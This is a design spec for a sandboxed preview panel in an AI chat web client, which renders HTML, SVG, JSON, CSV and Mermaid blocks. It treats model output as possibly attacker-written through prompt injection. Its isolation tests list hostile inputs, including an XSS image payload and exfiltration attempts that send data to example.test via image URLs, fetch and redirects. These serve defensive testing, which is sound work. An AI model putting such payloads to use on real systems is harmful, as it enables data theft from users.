# Spec 014: Preview Panel for Rendered Content in the Chat

**Status:** In Review
**Date:** 2026-11-03

Phase 1 of three. Phase 2 (named, versioned artifacts the model emits) and phase 3 (MCP Apps, `ui://` resources returned by MCP tools) are recorded as deferred decisions; the design here is meant to be reused by both.

## Problem
Assistants often answer with content that is meant to be looked at, not read: an HTML page, an SVG, a JSON document, a CSV, a Mermaid diagram. The chat shows it as raw text in a code block, so the user has to copy it into another tool to see what it is. Other products show the rendering in a side panel next to the conversation (Claude Artifacts, Gemini Canvas, Open WebUI, LibreChat).

Rendering is not neutral here. Quorum reads knowledge base documents and fetches web pages (specs 003, 006), so the content of a block, HTML above all, may have been written by an attacker through prompt injection. `MarkdownRenderer` already treats the model's text as untrusted (raw HTML off, images turned into links so that the browser never fetches an address chosen by the model). The preview panel must keep that stance: showing a page must never give it the user's session or a way to send data out.

This spec adds, in the web client only, a right-hand **preview panel** opened from a **Preview** action on fenced code blocks of the supported kinds. The chat keeps showing the raw text. No backend, model or protocol change; it works with any model.

## Scope
### In
- A **Preview** button on closed fenced code blocks of an assistant message whose tag is `html`, `htm`, `svg`, `json`, `csv`, `mermaid` or `mmd` (D-1, D-2).
- A right-hand **panel** that renders the block, with Copy, Download and, for HTML, the consent-gated **Run scripts** and **Load remote images** switches (D-3, D-4, D-17, D-18).
- One **sandboxed viewer** hosting every renderer, with the untrusted HTML in a second, nested sandboxed frame (D-6 to D-10).
- Renderers: HTML and SVG as pages, JSON as a collapsible tree, CSV as a table, Mermaid as a diagram (D-11 to D-14).
- Two vendored third-party libraries, `json-formatter-js` and `mermaid`, loaded on demand and only from the app's own origin (D-15).
- Size limits and error states (D-16, D-19).
- Layout: split on desktop, full screen below 960 px; light and dark theme (D-20, D-21).
- A design that does not assume where the content came from (D-5).

### Out
- Anything server-side: no endpoint, no entity, no migration, no model or prompt change, no change to the stored messages.
- **Markdown** preview: the chat already renders markdown (deferred).
- **Tool call results** in the ledger (`ToolCallGroup`, `ToolCallCard`) do not open in the panel. They are a log of what was called, not content the assistant presents; the ledger stays as it is.
- Persistence of previews, names, versions and in-place updates by the model (phase 2).
- Interaction between the preview and the assistant or the host: no way for a previewed page to call tools, send messages or read the conversation (phase 3 defines it).
- Editing the content in the panel.
- A Content-Security-Policy for the app's own pages (see deferred decisions).
- Formats other than the five listed, and previews of blocks without a recognised tag.

## Decisions
Decisions of specs 001 to 013 not listed here stand.

| # | Decision |
|---|---|
| D-1 | **Which blocks.** A fenced code block of an assistant message gets a Preview button if its info string is one of `html`, `htm`, `svg`, `json`, `csv`, `mermaid`, `mmd` (case-insensitive). Nothing is detected from the content: an untagged block, or one tagged `xml` or `text`, has no Preview, even if it looks like JSON. `htm` is treated as `html` and `mmd` as `mermaid`. User messages, reasoning text and tool results have no Preview. |
| D-2 | **Only closed blocks.** While an answer streams, a block shows the button only once its closing fence has arrived. The panel never renders a block that is still growing, and a panel that is already open is not updated by the stream. When the stream ends, the blocks of the final message are the ones that carry the button. |
| D-3 | **Panel.** One panel at the right of the chat, one preview at a time: pressing Preview on another block replaces the content. It stays open while the user stays in the same conversation (sending messages, regenerating, scrolling) and closes when the conversation changes, the user leaves the chat page or the page is reloaded. Nothing is stored. It closes with the X button or Esc while the focus is inside it. |
| D-4 | **Actions.** The bar of the panel shows the kind and a title (for instance "HTML", "JSON · 3.2 KB"), **Copy** (the raw text of the block to the clipboard), **Download** and, for HTML, the two switches of D-17 and D-18. Download saves the raw text as `preview.<ext>` with `html`, `svg`, `json`, `csv` or `mmd`, built from a local `Blob` (no request). There is no Source tab: the chat already shows the raw text. |
| D-5 | **Reusable by design.** The panel and the viewer take a content descriptor (`kind`, `text`, optional `title`) and know nothing of fenced blocks, messages or conversations. The fenced block is only the first producer. Phase 2 produces descriptors from artifacts and phase 3 from `ui://` resources without touching the panel, the viewer or the consent rules. |
| D-6 | **One viewer for every format.** All content is rendered inside one **viewer**: a static page served from the app (`wwwroot`), embedded in an `<iframe sandbox="allow-scripts">` **without** `allow-same-origin`, so it has an opaque origin and cannot read the app's storage, cookies, tokens or DOM, nor call the API with the user's credentials. It contains every renderer. The app (the "host") sends it `{ kind, text, theme, options }` with `postMessage`, and the viewer answers with its state (ready, rendered, error, height). No renderer runs in the app's own origin and no content text becomes part of the app's DOM. |
| D-7 | **The viewer cannot reach the network.** Its CSP is `default-src 'none'`, with `script-src` limited to the app's own vendored files plus the inline script of the viewer, `style-src 'unsafe-inline'`, `img-src data:`, `font-src data:`, no `connect-src`, `form-action 'none'`, `base-uri 'none'` and **`frame-src about:`**. The last directive matters: the navigation of a nested frame is checked against the CSP of the document that embeds it, so the HTML frame cannot navigate itself (a link, `<meta http-equiv="refresh">`, `location = …`) to an external address with data in the URL. The iframe has no `allow` permissions (no camera, microphone, clipboard, geolocation, payment). The mechanism that delivers the CSP (meta tag or header) is a plan detail; the requirement is the policy. |
| D-8 | **Messages are checked.** The host accepts messages only from the viewer's window (`event.source`), the viewer only from its parent. Messages carry data, never code: the host passes `text` as a string and the viewer never evaluates it. Nothing from the previewed page can send a message the host acts on, because the HTML runs in a nested frame (D-9) whose messages the viewer ignores. |
| D-9 | **HTML and SVG.** HTML runs in a second frame created by the viewer, `srcdoc` and `sandbox=""` (no scripts, no forms, no popups, no top navigation, no same-origin). The viewer builds the document: first a `<meta http-equiv="Content-Security-Policy">` that allows only inline styles and `data:` images and fonts (no scripts, no network, `form-action 'none'`, `base-uri 'none'`), then the block's text. The viewer's own CSP (D-7) is a second, independent barrier. The page has a white canvas whatever the theme (D-21). Links are inert: a click does nothing and no URL is opened. SVG is shown as `<img src="data:image/svg+xml;…">`, which never runs script and loads nothing external. |
| D-10 | **No other way out.** There is no Open in new tab, no popup and no external link from a preview. The sandboxes have neither `allow-popups` nor `allow-top-navigation`. A block that needs an external resource (a CDN script, a remote font) renders without it and the panel says that external resources are blocked (D-17, D-18 list the only two ways to change that). |
| D-11 | **JSON.** Rendered as a collapsible tree by **json-formatter-js** inside the viewer, with the root expanded one level and strings shown as text (never as HTML, never as links). Invalid JSON shows the parse error with its position and keeps Copy and Download. |
| D-12 | **CSV.** Parsed in the viewer following RFC 4180 (quoted fields, doubled quotes, newlines inside quotes). The delimiter is the most frequent of `,` `;` and tab on the first line. The first row is the header. Rendered as a table built with `textContent`, with a sticky header and horizontal scroll. Cells are never interpreted as formulas or links. Rows with a different number of cells are shown as they are. |
| D-13 | **Mermaid.** Rendered by **mermaid** in the viewer with `securityLevel: "strict"`, HTML labels off, and the viewer's theme (light or dark). A syntax error shows the message of the library and keeps Copy and Download. A render that takes more than 10 s is abandoned with a message. |
| D-14 | **Theme.** JSON, CSV, Mermaid and the viewer's own chrome follow the app's light or dark theme; the host sends a small set of colour values (not CSS from the page) at open and on every theme change. HTML and SVG keep a white canvas. |
| D-15 | **Vendored libraries.** `json-formatter-js` and `mermaid` are committed under the app's `wwwroot` (pinned version, the upstream licence file and a short note with the version and the SHA-256 of each file), loaded by the viewer on demand (Mermaid only when a Mermaid block is opened, as Monaco is today in `editor.js`) and only from the app's origin. Nothing comes from a CDN, in line with "no outbound telemetry" in `docs/product.md`. Upgrading them is a normal PR that updates the note. |
| D-16 | **Limits.** A block above **1 MB** of text, or a CSV above **5,000 rows**, is not rendered: the panel opens with the notice (for instance "This block is 2.4 MB; the preview limit is 1 MB") and keeps Copy and Download. The chat is not affected. |
| D-17 | **Run scripts (HTML only).** Off by default. The switch in the panel bar, when turned on, shows a confirmation: the code of this block will run isolated and without network access; it can still show anything on screen; with remote images also on (D-18) it could send what the page contains to external servers. The dialog has a "Don't ask me again" box. Confirmed, the HTML frame is recreated with `sandbox="allow-scripts"` and `script-src 'unsafe-inline'` added to its policy; everything else of D-9 holds. The switch goes off again when another preview replaces the content. With "Don't ask me again" checked, the next time the switch turns on without a dialog; the choice is kept in `localStorage`, per signed-in user, for every conversation, and the panel menu has an entry "Ask before running scripts" to take it back. If `localStorage` is unavailable the dialog is shown each time. |
| D-18 | **Load remote images (HTML only).** Same mechanism as D-17 with its own switch, dialog, box and stored choice: off by default; on, the HTML frame's policy gets `img-src https:` (no `http:`). The dialog says that a page can put what it contains in the address of an image. Replacing the preview turns it off again unless the stored choice says otherwise. |
| D-19 | **Failure states.** The viewer does not load or does not answer within 5 s, or a library fails to load: the panel shows "The preview could not start" with Retry, Copy and Download. A renderer error (D-11, D-13) is shown inside the panel, never as an exception in the app. A runaway script (infinite loop) can slow the tab; closing the panel removes the frames. |
| D-20 | **Layout.** On screens of 960 px and above the panel splits the page: the chat narrows and the panel takes its right side, 40% of the width by default, resizable by dragging its left edge between 320 px and 70%, the chosen width kept in `localStorage`. Below 960 px the panel is full screen over the chat with a Back/close button, as the drawers of spec 010 (D-18 of that spec). The raw text stays visible in the chat in the split layout. |
| D-21 | **Accessibility and theme.** The panel is a labelled `complementary` landmark; opening it moves the focus to it, closing it returns the focus to the Preview button that opened it; the frames have a `title`; the buttons have accessible names; all controls work with the keyboard. Light and dark both work, and the layout holds at 375 px. |
| D-22 | **Authorization.** Any signed-in user who can read the conversation sees the button. There is no role, no tenant dimension and no audit entry: nothing leaves the browser and nothing is stored. |
| D-23 | **Button markup.** The Preview button is produced by the same markdown pipeline that renders the message (`MarkdownRenderer`), as a button in the toolbar of the code block with a `data-` attribute naming the kind. One delegated click handler in the page reads the block's text from the DOM node and opens the panel. The text is never put in an attribute. Markdown raw HTML stays off. |

## Domain Model
No entity and no stored data.

Client-side state, in memory:
- **PreviewContent**: `kind` (`html`, `svg`, `json`, `csv`, `mermaid`), `text`, optional `title`. Created when the user presses Preview; replaced by the next one; dropped when the panel closes.
- **PreviewPanelState**: open or closed, current content, `runScripts`, `loadRemoteImages` for this preview.
- **Stored in `localStorage`** (per browser, keys scoped to the signed-in user): the "don't ask again" choices for D-17 and D-18, and the panel width (D-20).

## API Contract
None. No request is made by the preview. The files served by the Host are static assets only: the viewer page, its script and the two vendored libraries.

**Host ⇄ viewer messages** (`postMessage`, structured data only):

| Direction | Message | Fields |
|---|---|---|
| host → viewer | `render` | `kind`, `text`, `theme` (colour values), `options` (`runScripts`, `loadRemoteImages`) |
| host → viewer | `theme` | colour values |
| viewer → host | `ready` | none |
| viewer → host | `rendered` | `height` (for the frame, when the kind sizes itself) |
| viewer → host | `error` | `code` (`parse`, `timeout`, `library`), `message` |

## Authorization
D-22. The panel is shown to everyone who can open the chat. The previewed content comes from the conversation the user is already allowed to read.

## Edge Cases & Failure Modes
- **Prompt injection through a knowledge base document or a fetched page** produces an HTML block that tries to read the session, call the API, send data out or lure the user. Isolation (D-6), no network (D-7), no navigation (D-7, D-10) and consent for scripts and remote images (D-17, D-18) are what contain it. With scripts off it can only show content.
- **Content that looks trustworthy** (a fake sign-in form) can still be shown, because the panel renders what the model wrote. Forms do not submit (`form-action 'none'`, no `allow-forms`). The panel bar always shows that this is a preview of model output, outside the page's own styling.
- **Both switches on** (scripts and remote images) re-open a way to send data out: the page can write what it knows into an image address. The dialogs of D-17 and D-18 say so; the stored choices are separate on purpose.
- **WebRTC and similar** are not governed by `connect-src` in every browser. This is accepted as a residual risk because scripts only run after the user's explicit consent (D-17); the browser check records what the target browsers do.
- **An SVG with script or external references** is shown through an `<img>`, so script does not run and nothing external loads.
- **A block regenerated or removed** while the panel shows it: the panel keeps its copy until closed.
- **Two blocks with the same text**: each button opens its own content; nothing is deduplicated.
- **The message is still streaming when Preview is pressed on an earlier closed block**: the panel opens and the stream goes on unaffected.
- **A very long single line or deeply nested JSON**: the tree collapses below the first level and scrolls inside the viewer; the limit of D-16 applies to the size, not the depth.
- **Unicode and RTL text**: rendered by the browser as text; no special handling.
- **Clipboard or `Blob` download blocked by the browser**: the action shows an inline failure and the panel stays usable.
- **`localStorage` unavailable**: dialogs appear every time and the width is not remembered; everything else works.

## Non-Functional Requirements
- **Security**: the controls of D-6 to D-10, D-17, D-18 are the requirement; they are verified in a real browser (see Acceptance Criteria) because the unit tests cannot enforce them.
- **Performance**: no cost for a conversation that never opens a preview: the viewer and the libraries load on the first Preview (Mermaid on the first Mermaid block). A JSON or CSV block within the limits renders in under 1 s on a laptop. Adding the button must not slow the streaming render of an answer.
- **Footprint**: the two libraries add to the published output (Mermaid is the large one, a few MB); they are fetched only when used.
- **Offline**: works with no outbound access, since nothing is fetched from outside the app.
- **Compatibility**: current Chromium, Firefox and Safari, which support `sandbox`, `srcdoc` and CSP in `<meta>`.

## Integrations
- None outside Quorum. No module, event or endpoint is touched.
- Third-party code: `json-formatter-js` and `mermaid`, vendored (D-15). Their licences are checked at the plan and listed with the version note.
- Reuses what exists: `MarkdownRenderer` (button markup), `chat.js` (page glue), the on-demand loading pattern of `editor.js`, MudBlazor for the panel chrome and the dialogs, the theme state (`ThemeState`).

## Acceptance Criteria
**Button**
- **AC-1** Given an assistant message with fenced blocks tagged `html`, `htm`, `svg`, `json`, `csv`, `mermaid` and `mmd`, When it is shown, Then each of them has a Preview button.
- **AC-2** Given blocks tagged `xml`, `text`, `javascript` or untagged, including one whose content is valid JSON, When the message is shown, Then they have no Preview button.
- **AC-3** Given a message that is streaming with a ```` ```html ```` block whose closing fence has not arrived, When it is shown, Then that block has no button; once the fence arrives, Then it does.
- **AC-4** Given a user message, the reasoning text or a tool result containing a tagged block, When shown, Then no Preview button appears.
- **AC-5** Given the markdown text of a message containing raw HTML, When rendered, Then raw HTML is still not rendered and the only added markup is the button and its `data-` attribute.

**Panel**
- **AC-6** Given a closed `json` block, When the user presses Preview, Then the panel opens at the right with the tree, and the chat still shows the raw block.
- **AC-7** Given the panel open on a block, When the user presses Preview on another block, Then the content is replaced and there is still one panel.
- **AC-8** Given the panel open, When the user sends a message, regenerates the answer or scrolls, Then it stays open and unchanged; when the user opens another conversation, leaves the chat page or reloads, Then it is closed.
- **AC-9** Given the panel open, When the user presses X, or Esc with the focus inside it, Then it closes and the focus returns to the Preview button that opened it.
- **AC-10** Given a screen of 960 px or more, When the panel is open, Then the chat narrows and the panel shows beside it, resizable between 320 px and 70% of the width, and the width is kept after a reload.
- **AC-11** Given a screen below 960 px (375 px wide included), When the panel opens, Then it covers the screen with a button that returns to the chat, and nothing scrolls horizontally on the page.
- **AC-12** Given light and dark themes, When a JSON, CSV or Mermaid preview is open and the theme changes, Then the content follows the theme; an HTML or SVG preview keeps a white canvas.
- **AC-13** Given the panel, When used with the keyboard and a screen reader, Then it is a labelled landmark, focus moves in on open, and every control and frame has an accessible name.

**Formats**
- **AC-14** Given a valid `json` block, When previewed, Then it shows a collapsible tree expanded one level; given a JSON string containing `<img src=x onerror=alert(1)>` or `javascript:` text, Then it appears as plain text and nothing runs or becomes a link.
- **AC-15** Given an invalid `json` block, When previewed, Then the panel shows the parse error with its position and Copy and Download still work.
- **AC-16** Given a `csv` block with quoted fields, doubled quotes, an embedded newline and a `;` delimiter, When previewed, Then it is a table with the right cells, a sticky header, and a cell starting with `=` or containing `<script>` appears as text.
- **AC-17** Given a valid `mermaid` block, When previewed, Then the diagram is drawn with the current theme and Mermaid was loaded only now; given a syntax error, Then the library's message is shown with Copy and Download.
- **AC-18** Given an `svg` block containing `<script>`, an `onload` handler and an external `<image href="https://…">`, When previewed, Then the image is shown and no script runs and no request is made.
- **AC-19** Given an `html` block with CSS and an inline data-URI image, When previewed, Then it renders on a white canvas in the nested frame.

**Copy, Download**
- **AC-20** Given any previewed block, When Copy is pressed, Then the exact raw text is on the clipboard; When Download is pressed, Then a file `preview.html`, `.svg`, `.json`, `.csv` or `.mmd` with the same text is saved and no network request is made.

**Isolation (verified in a real browser)**
- **AC-21** Given an HTML block with a script, When previewed with Run scripts off, Then the script does not run.
- **AC-22** Given the viewer, When code running in it reads `localStorage`, `document.cookie`, `window.parent.document` or calls the app's API, Then each fails because the origin is opaque.
- **AC-23** Given an HTML block with a link, a form, `<meta http-equiv="refresh" content="0;url=https://example.test/">` and `<base href="https://example.test/">`, When previewed (scripts on or off), Then no navigation, request or popup happens and clicking does nothing.
- **AC-24** Given an HTML block that, with Run scripts on, calls `fetch`, `XMLHttpRequest`, `WebSocket`, `new Image().src = "https://example.test/?d=…"`, `window.open`, `location = "https://example.test/"` and `window.top.location`, When previewed with remote images off, Then each is blocked and no request leaves the browser (checked in the browser's network log).
- **AC-25** Given an HTML block with `<img src="https://example.test/p.png">`, When previewed with Load remote images off, Then no request is made; with it on, Then the image is requested and nothing else external is.
- **AC-26** Given the previewed HTML closing the head and body and adding its own `<meta http-equiv="Content-Security-Policy">` with a looser policy, When rendered, Then the policy of the viewer and the frame still holds.
- **AC-27** Given messages posted to the host from any window other than the viewer, or by code inside the nested HTML frame, When received, Then the host ignores them.

**Consent**
- **AC-28** Given an HTML preview, When the user turns Run scripts on, Then a dialog explains the risk; Cancel leaves the switch off; Confirm recreates the frame with scripts and the switch stays on only for this preview.
- **AC-29** Given the dialog with "Don't ask me again" checked and confirmed, When the user later turns Run scripts on, Then no dialog appears, the choice survives a reload and applies to every conversation of that user but not to another user of the same browser; the panel menu entry "Ask before running scripts" removes it.
- **AC-30** Given Load remote images, Then AC-28 and AC-29 hold with its own dialog, its own box and its own stored choice, independent of Run scripts.
- **AC-31** Given `localStorage` unavailable, When a switch is turned on, Then the dialog appears every time and the page works.

**Limits and failures**
- **AC-32** Given a block above 1 MB, or a CSV above 5,000 rows, When Preview is pressed, Then the panel shows the limit notice with Copy and Download and renders nothing.
- **AC-33** Given the viewer failing to load or not answering within 5 s, or a library failing to load, When Preview is pressed, Then the panel shows "The preview could not start" with Retry, Copy and Download, and the chat is unaffected.
- **AC-34** Given a Mermaid render exceeding 10 s, When it happens, Then it is abandoned with a message.

**Non-functional**
- **AC-35** Given a conversation where no preview is opened, When the page loads, Then neither the viewer nor any vendored library is requested.
- **AC-36** Given the application running with no outbound access, When any preview is opened, Then it works.
- **AC-37** Given the build, When the published output is inspected, Then the two libraries are present with their licence files and the version note (D-15), and nothing in the viewer references an external address.

## Deferred Decisions
| Decision | Chosen fallback | Revisit when |
|---|---|---|
| Phase 2: named, versioned artifacts the model emits and updates in place, with persistence | Previews are ephemeral and come only from fenced blocks; the panel and viewer already take a content descriptor (D-5) | Users ask to keep or iterate on previews, or the model needs to update one in place |
| Phase 3: MCP Apps / `ui://` resources returned by MCP tools (spec 004) | Not supported; MCP tool results stay in the ledger as text | The MCP Apps extension is stable and a tool the product ships needs it. It would reuse the viewer as the sandbox proxy and add the host ⇄ app messages |
| Markdown preview | Not offered; the chat renders markdown | A real need for a separate rendered view |
| Other formats (XML, YAML, TSV, LaTeX, PlantUML) | Not offered; `tsv` is not an alias, but the CSV delimiter detection reads tabs | Requests from users |
| Content sniffing of untagged blocks | Tag only (D-1) | Small models often omit the tag |
| Content-Security-Policy for the app's own pages | Not set; the isolation of this spec does not depend on it | A separate hardening spec for the Host |
| Remembering the consent on the server, per user profile | `localStorage` per browser and user (D-17) | A backend user-preferences store exists |
| Several previews in tabs, pop-out to a window, fullscreen | One preview at a time, in the panel | Phase 2 |
| Playwright in the test suite | bUnit for the components, tests on the sandbox and CSP strings, and a recorded browser check (AC-21 to AC-27) | The sandbox changes often or a regression slips through |

## Open Questions
None.
